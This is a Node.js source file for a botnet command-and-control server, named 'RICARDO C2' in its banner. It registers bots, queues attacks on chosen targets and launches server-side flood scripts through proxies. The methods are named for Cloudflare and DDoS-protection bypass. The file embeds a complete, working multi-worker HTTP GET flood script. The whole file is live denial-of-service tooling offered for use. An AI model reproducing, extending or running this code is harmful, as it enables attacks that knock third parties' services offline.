const express = require('express');
const { exec, spawn } = require('child_process');
const axios = require('axios');
const fs = require('fs');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const path = require('path');

const app = express();
app.use(express.json());

// [FIX] Tell Express to trust the proxy (required for rate limiting on Render)
app.set('trust proxy', 1);

const port = process.env.PORT || 5553;
const AUTH_TOKEN = "ricardo";

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100
});
app.use('/api/', limiter);

// Auth middleware
const authenticate = (req, res, next) => {
  const token = req.headers['authorization'] || req.query.token;
  if (token !== AUTH_TOKEN) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  next();
};

// Store connected bots
let connectedBots = [];
let pendingCommands = {};
let stopCommands = new Set();
let blockedBots = new Set();
let attackHistory = [];

// Stats
let botStats = {
  totalAttacks: 0,
  activeAttacks: 0,
  totalBots: 0,
  requestsPerSecond: 0,
  requestsPerMinute: 0,
  totalRequests: 0,
  attacksByMethod: {},
  attacksByTarget: {},
  botsByStatus: { online: 0, offline: 0, attacking: 0 },
  averageResponseTime: 0,
  peakRPS: 0,
  peakRPM: 0,
  lastMinuteRequests: [],
  lastHourAttacks: []
};

let requestTimestamps = [];
let minuteRequestCount = 0;
let currentMinute = new Date().getMinutes();

setInterval(() => {
  const now = Date.now();
  requestTimestamps = requestTimestamps.filter(ts => now - ts < 1000);
  botStats.requestsPerSecond = requestTimestamps.length;
  if (botStats.requestsPerSecond > botStats.peakRPS) botStats.peakRPS = botStats.requestsPerSecond;
}, 1000);

setInterval(() => {
  const minute = new Date().getMinutes();
  if (minute !== currentMinute) {
    botStats.requestsPerMinute = minuteRequestCount;
    if (minuteRequestCount > botStats.peakRPM) botStats.peakRPM = minuteRequestCount;
    botStats.lastMinuteRequests.push({ minute: new Date().toLocaleTimeString(), count: minuteRequestCount });
    if (botStats.lastMinuteRequests.length > 60) botStats.lastMinuteRequests.shift();
    minuteRequestCount = 0;
    currentMinute = minute;
  }
}, 1000);

app.use((req, res, next) => {
  const start = Date.now();
  requestTimestamps.push(start);
  minuteRequestCount++;
  botStats.totalRequests++;
  res.on('finish', () => {
    const duration = Date.now() - start;
    botStats.averageResponseTime = botStats.averageResponseTime === 0 ? duration : (botStats.averageResponseTime * 0.9) + (duration * 0.1);
  });
  next();
});

// Bot timeout
const BOT_TIMEOUT = 30000;
setInterval(() => {
  const now = Date.now();
  connectedBots = connectedBots.filter(bot => now - bot.lastSeen <= BOT_TIMEOUT);
  const online = connectedBots.filter(b => now - b.lastSeen < 10000).length;
  botStats.botsByStatus = {
    online: online,
    offline: connectedBots.length - online,
    attacking: activeAttackCount()
  };
  botStats.totalBots = connectedBots.length;
}, 10000);

function activeAttackCount() {
  return connectedBots.filter(bot => pendingCommands[bot.id]).length;
}

// Method mapping (for filename lookup)
function getMethodFilename(method) {
  const methodMap = {
    'R9': 'high-dstat',
    'PRIV-TOR': 'w-flood1',
    'HOLD-PANEL': 'http-panel',
    'R1': 'vhold',
    'UAM': 'uam',
    'W.I.L': 'wil',
    'HTTP-SICARIO': 'REX-COSTUM',
    'RAW-HTTP': 'h2-nust',
    'CF-BYPASS': 'cf-bypass',
    'MODERN-FLOOD': 'modern-flood',
    'RAW-GET': 'raw-get',
    'BYPASS': 'BYPASS',
    'R-GOST': 'R-GOST',
    'browsersun': 'browsersun',
    'cibi': 'cibi',
    'h2ca': 'h2ca',
    'kbrowser': 'kbrowser',
    'nust': 'nust',
    'w-flood1': 'w-flood1',
    'vhold': 'vhold',
    'wil': 'wil',
    'tlsop': 'tlsop',
    'uambypass': 'uambypass'
  };
  if (methodMap[method]) return methodMap[method];
  return method.toLowerCase().replace(/[\s.]+/g, '-');
}

// Universal command runner (supports .exe and .js; no .cs)
function runAttackCommand(method, target, time, additionalArgs = [], callback = () => {}) {
  const baseName = getMethodFilename(method);
  const methodsDir = path.join(__dirname, 'methods');
  const exePath = path.join(methodsDir, `${baseName}.exe`);
  const jsPath = path.join(methodsDir, `${baseName}.js`);

  let command, argsList;

  if (fs.existsSync(exePath)) {
    command = exePath;
    argsList = [target, time.toString(), ...additionalArgs];
    console.log(`[SERVER-EXEC] EXE: ${command} ${argsList.join(' ')}`);
  } else if (fs.existsSync(jsPath)) {
    command = 'node';
    argsList = [jsPath, target, time.toString(), ...additionalArgs];
    console.log(`[SERVER-EXEC] Node.js: ${command} ${argsList.join(' ')}`);
  } else {
    console.error(`[ERROR] No executable found for method: ${method} (tried .exe, .js)`);
    callback(new Error(`No executable for ${method}`));
    return null;
  }

  const proc = spawn(command, argsList, { detached: true, stdio: 'pipe' });
  let output = '';
  proc.stdout.on('data', (data) => output += data.toString());
  proc.stderr.on('data', (data) => console.error(`[STDERR] ${data}`));
  proc.on('error', (err) => {
    console.error(`[ERROR] ${err.message}`);
    callback(err);
  });
  proc.on('close', (code) => {
    console.log(`[OUTPUT] ${output}`);
    callback(null, output);
  });
  return proc;
}

// Ensure methods directory and create missing stub scripts (Node.js only)
function ensureMethodScripts() {
  const methodsDir = path.join(__dirname, 'methods');
  if (!fs.existsSync(methodsDir)) fs.mkdirSync(methodsDir, { recursive: true });

  const writeStub = (filename, content) => {
    const filePath = path.join(methodsDir, filename);
    if (!fs.existsSync(filePath)) {
      fs.writeFileSync(filePath, content);
      console.log(`[SETUP] Created ${filename}`);
    }
  };

  // Node.js stub for missing methods
  const jsStub = (name) => `console.log('[${name.toUpperCase()}] Starting attack'); const target = process.argv[2]; const time = parseInt(process.argv[3]) || 60; setTimeout(() => process.exit(0), time * 1000);`;

  const jsMethods = [
    'nust', 'w-flood1', 'vhold', 'uam', 'wil',
    'r10-rapid', 'r10-tcp', 'r10-tls', 'r10-conn', 'r10-header',
    'r10-frag', 'r10-pipe', 'r10-cookie', 'r10-mixed', 'r10-lowcpu',
    'BYPASS', 'R-GOST', 'REX-COSTUM', 'browsersun', 'cf-bypass', 'cibi',
    'h2-nust', 'h2ca', 'high-dstat', 'http-panel', 'kbrowser', 'modern-flood', 'raw-get'
  ];
  for (const m of jsMethods) {
    writeStub(`${m}.js`, jsStub(m));
  }

  // Also ensure raw-get.js (full version) exists
  const rawGetJsPath = path.join(methodsDir, 'raw-get.js');
  if (!fs.existsSync(rawGetJsPath)) {
    const rawGetJs = `#!/usr/bin/env node
// RAW-GET Flood - No proxies
const http = require('http');
const https = require('https');
const url = require('url');
const cluster = require('cluster');
const args = { target: process.argv[2], time: parseInt(process.argv[3]) || 60, threads: parseInt(process.argv[4]) || 10, rate: parseInt(process.argv[5]) || 1000 };
const parsed = new URL(args.target);
const isHttps = parsed.protocol === 'https:';
const httpLib = isHttps ? https : http;
const keepAliveAgent = new httpLib.Agent({ keepAlive: true, keepAliveMsecs: 10000, maxSockets: Infinity, maxFreeSockets: 256, timeout: 60000 });
if (cluster.isMaster) {
    console.log(\`\\n🔥 RAW-GET (no proxy) | Target: \${args.target} | Time: \${args.time}s | Rate: \${args.rate}/s/worker | Workers: \${args.threads}\`);
    for (let i = 0; i < args.threads; i++) cluster.fork();
    setTimeout(() => process.exit(0), args.time * 1000 + 2000);
} else {
    let running = true;
    let requestCount = 0;
    function sendRequest() {
        if (!running) return;
        const options = { hostname: parsed.hostname, port: parsed.port || (isHttps ? 443 : 80), path: parsed.pathname + (parsed.search ? parsed.search + '&' : '?') + Math.random(), method: 'GET', headers: { 'User-Agent': 'Mozilla/5.0', 'Accept': 'text/html', 'Connection': 'keep-alive' }, agent: keepAliveAgent, rejectUnauthorized: false };
        const req = httpLib.request(options, (res) => { requestCount++; res.resume(); });
        req.on('error', () => {});
        req.end();
    }
    const intervalMs = 1000 / args.rate;
    const intervalId = setInterval(() => sendRequest(), intervalMs);
    setInterval(() => { console.log(\`RPS: \${requestCount}\`); requestCount = 0; }, 1000);
    setTimeout(() => { running = false; clearInterval(intervalId); process.exit(0); }, args.time * 1000);
}
`;
    fs.writeFileSync(rawGetJsPath, rawGetJs);
    console.log('[SETUP] Created methods/raw-get.js');
  }
}
ensureMethodScripts();

// ========== API ENDPOINTS ==========

app.post('/api/report', authenticate, (req, res) => {
  const { botId, target, method, requests, duration } = req.body;
  const bot = connectedBots.find(b => b.id === botId);
  if (bot) {
    bot.attacksPerformed = (bot.attacksPerformed || 0) + 1;
    bot.totalRequests = (bot.totalRequests || 0) + (requests || 0);
    bot.lastReport = Date.now();
  }
  botStats.totalRequests += requests || 0;
  botStats.attacksByMethod[method] = (botStats.attacksByMethod[method] || 0) + 1;
  botStats.attacksByTarget[target] = (botStats.attacksByTarget[target] || 0) + 1;
  console.log(`\n[REPORT] ${botId} sent ${requests || 0} requests to ${target} using ${method}`);
  res.json({ success: true });
});

app.get('/api/stats', authenticate, (req, res) => {
  const now = Date.now();
  const online = connectedBots.filter(b => now - b.lastSeen < 10000).length;
  botStats.botsByStatus = { online, offline: connectedBots.length - online, attacking: activeAttackCount() };
  botStats.totalBots = connectedBots.length;
  res.json(botStats);
});

app.post('/register', (req, res) => {
  let { id, name, url } = req.body;
  if (!id) {
    if (url) id = url;
    else return res.status(400).json({ error: 'Bot unique id required' });
  }
  if (blockedBots.has(id)) {
    console.log(`[BLOCKED] Bot tried to register: ${id}`);
    return res.status(403).json({ error: 'Bot is blocked', approved: false });
  }
  const existing = connectedBots.find(b => b.id === id);
  if (existing) {
    existing.lastSeen = Date.now();
    return res.json({ message: 'Bot already registered', approved: true, bot: existing });
  }
  const botName = name || `agent-${id.slice(-6)}`;
  const newBot = { 
    id, name: botName, lastSeen: Date.now(), registeredAt: new Date().toLocaleString(), 
    attacksPerformed: 0, totalRequests: 0 
  };
  connectedBots.push(newBot);
  botStats.totalBots = connectedBots.length;
  console.log(`[AUTO-APPROVED] New bot registered: ${botName} (${id})`);
  res.json({ message: 'Bot auto-approved', approved: true, bot: newBot });
});

app.get('/get-command', (req, res) => {
  const { botId } = req.query;
  if (!botId) return res.status(400).json({ error: 'Bot ID required' });
  const bot = connectedBots.find(b => b.id === botId);
  if (bot) bot.lastSeen = Date.now();
  if (stopCommands.has(botId)) {
    stopCommands.delete(botId);
    return res.json({ hasCommand: true, command: { action: 'stop' } });
  }
  if (pendingCommands[botId]) {
    const command = pendingCommands[botId];
    delete pendingCommands[botId];
    return res.json({ hasCommand: true, command: { action: 'attack', ...command } });
  }
  res.json({ hasCommand: false });
});

app.get('/bots', authenticate, (req, res) => {
  const botsForUI = connectedBots.map(b => ({
    id: b.id, name: b.name, lastSeen: b.lastSeen, registeredAt: b.registeredAt,
    attacksPerformed: b.attacksPerformed || 0, totalRequests: b.totalRequests || 0
  }));
  res.json({ bots: botsForUI });
});

app.get('/attack-bot', authenticate, async (req, res) => {
  const { botId, target, time, methods } = req.query;
  if (!botId || !target || !time || !methods) return res.json({ success: false, error: 'Missing parameters' });
  const timeNum = parseInt(time);
  if (isNaN(timeNum) || timeNum < 1 || timeNum > 3600) return res.json({ success: false, error: 'Invalid time' });
  const bot = connectedBots.find(b => b.id === botId);
  if (!bot) return res.json({ success: false, error: 'Bot not found' });
  pendingCommands[botId] = { target, time: timeNum, methods, timestamp: Date.now() };
  botStats.totalAttacks++;
  botStats.activeAttacks++;
  botStats.attacksByMethod[methods] = (botStats.attacksByMethod[methods] || 0) + 1;
  console.log(`[CMD] Attack queued for bot ${bot.name} (${botId}): ${methods} → ${target} for ${timeNum}s`);
  res.json({ success: true, message: `Command sent to ${bot.name}` });
});

app.get('/stop-bot', authenticate, async (req, res) => {
  const { botId } = req.query;
  if (!botId) return res.json({ success: false, error: 'Bot ID required' });
  delete pendingCommands[botId];
  stopCommands.add(botId);
  res.json({ success: true, message: 'Stop command sent' });
});

app.get('/stop-all', authenticate, async (req, res) => {
  pendingCommands = {};
  connectedBots.forEach(bot => stopCommands.add(bot.id));
  botStats.activeAttacks = 0;
  res.json({ success: true, message: `Stop queued for ${connectedBots.length} bots` });
});

app.get('/block-bot', authenticate, (req, res) => {
  const { botId } = req.query;
  if (!botId) return res.json({ success: false, error: 'Bot ID required' });
  blockedBots.add(botId);
  connectedBots = connectedBots.filter(b => b.id !== botId);
  delete pendingCommands[botId];
  stopCommands.delete(botId);
  botStats.totalBots = connectedBots.length;
  res.json({ success: true, message: 'Bot blocked', botId });
});

app.get('/unblock-bot', authenticate, (req, res) => {
  const { botId } = req.query;
  if (!botId) return res.json({ success: false, error: 'Bot ID required' });
  blockedBots.delete(botId);
  res.json({ success: true, message: 'Bot unblocked', botId });
});

app.get('/blocked', authenticate, (req, res) => res.json({ blocked: Array.from(blockedBots) }));

app.get('/ping', (req, res) => res.json({ alive: true, timestamp: Date.now(), uptime: process.uptime() }));

// ========== SERVER-SIDE ATTACK ENDPOINT (UPDATED: .exe or .js only) ==========
app.get('/attack', authenticate, (req, res) => {
  const { target, time, methods } = req.query;
  if (!target || !time || !methods) return res.status(400).json({ error: 'Missing required parameters' });
  const timeNum = parseInt(time);
  if (isNaN(timeNum) || timeNum < 1 || timeNum > 3600) return res.status(400).json({ error: 'Invalid time' });

  console.log(`\n[SERVER-ATTACK] ${methods} -> ${target} for ${timeNum}s`);
  attackHistory.push({ target, time: timeNum, method: methods, timestamp: Date.now() });
  botStats.totalAttacks++;
  botStats.activeAttacks++;
  botStats.attacksByMethod[methods] = (botStats.attacksByMethod[methods] || 0) + 1;
  botStats.attacksByTarget[target] = (botStats.attacksByTarget[target] || 0) + 1;
  res.status(200).json({ message: 'Server attack launched', target, time: timeNum, methods });

  let activeProcesses = [];

  const finish = () => {
    botStats.activeAttacks = Math.max(0, botStats.activeAttacks - 1);
  };

  // Helper to run a command and track process
  const run = (method, additionalArgs = []) => {
    const proc = runAttackCommand(method, target, timeNum, additionalArgs, (err) => {
      if (err) console.error(`[ERROR] ${method} failed: ${err.message}`);
    });
    if (proc) activeProcesses.push(proc);
  };

  // Attack definitions
  switch(methods) {
    case 'RAPID10':
      const r10files = ['r10-rapid', 'r10-tcp', 'r10-tls', 'r10-conn', 'r10-header',
                        'r10-frag', 'r10-pipe', 'r10-cookie', 'r10-mixed', 'r10-lowcpu'];
      for (const f of r10files) run(f, ['30', 'proxy.txt', 'ua.txt']);
      break;
    case 'CF-BYPASS':
      run('cf-bypass', ['4', '32', 'proxy.txt']);
      break;
    case 'MODERN-FLOOD':
      run('modern-flood', ['4', '64', 'proxy.txt']);
      break;
    case 'HTTP-SICARIO':
      run('REX-COSTUM', ['32', '6', 'proxy.txt', '--randrate', '--full', '--legit', '--query', '1']);
      run('cibi', ['16', '3', 'proxy.txt']);
      run('BYPASS', ['32', '2', 'proxy.txt']);
      run('nust', ['12', '4', 'proxy.txt']);
      break;
    case 'RAW-HTTP':
      run('h2-nust', ['15', '2', 'proxy.txt']);
      run('http-panel', []);
      break;
    case 'RAW-GET':
      run('raw-get', ['20', '800']);
      break;
    case 'R9':
      run('high-dstat', ['32', '7', 'proxy.txt']);
      run('w-flood1', ['8', '3', 'proxy.txt']);
      run('vhold', ['16', '2', 'proxy.txt']);
      run('nust', ['16', '2', 'proxy.txt']);
      run('BYPASS', ['8', '1', 'proxy.txt']);
      break;
    case 'PRIV-TOR':
      run('w-flood1', ['64', '6', 'proxy.txt']);
      run('high-dstat', ['16', '2', 'proxy.txt']);
      run('cibi', ['12', '4', 'proxy.txt']);
      run('BYPASS', ['10', '4', 'proxy.txt']);
      run('nust', ['10', '1', 'proxy.txt']);
      break;
    case 'HOLD-PANEL':
      run('http-panel', []);
      break;
    case 'R1':
      run('vhold', ['15', '2', 'proxy.txt']);
      run('high-dstat', ['64', '2', 'proxy.txt']);
      run('cibi', ['4', '2', 'proxy.txt']);
      run('BYPASS', ['16', '2', 'proxy.txt']);
      run('REX-COSTUM', ['32', '6', 'proxy.txt', '--randrate', '--full', '--legit', '--query', '1']);
      run('w-flood1', ['8', '3', 'proxy.txt']);
      run('vhold', ['16', '2', 'proxy.txt']);
      run('nust', ['32', '3', 'proxy.txt']);
      break;
    case 'UAM':
      run('uam', ['5', '4', '6']);
      break;
    case 'W.I.L':
      run('wil', ['10', '8', '4']);
      break;
    default:
      // Single-file method
      run(methods, []);
      break;
  }

  // Clean up after duration
  setTimeout(() => {
    activeProcesses.forEach(proc => {
      try { proc.kill(); } catch(e) {}
    });
    finish();
  }, timeNum * 1000 + 5000);
});

// Error handling
app.use((err, req, res, next) => {
  console.error('[SERVER ERROR]', err.stack);
  res.status(500).json({ error: 'Internal server error' });
});

// Start server
app.listen(port, () => {
  console.log('\n========================================');
  console.log('🚀 RICARDO C2 SERVER STARTED (API ONLY)');
  console.log('========================================');
  console.log(`📍 Listening on port ${port}`);
  console.log(`🔑 Auth Token: ${AUTH_TOKEN}`);
  console.log(`📊 Live Stats: ENABLED`);
  console.log(`🔥 Attack methods: .exe or .js (no dotnet required)`);
  console.log('========================================\n');
  
  if (!fs.existsSync('./proxy.txt')) fs.writeFileSync('./proxy.txt', '# Add your proxies here\n# Format: ip:port\n');
  console.log('📁 Required files:');
  console.log('   - /methods/ - attack scripts (.exe or .js)');
  console.log('   - proxy.txt - add your proxies (one per line)\n');
});
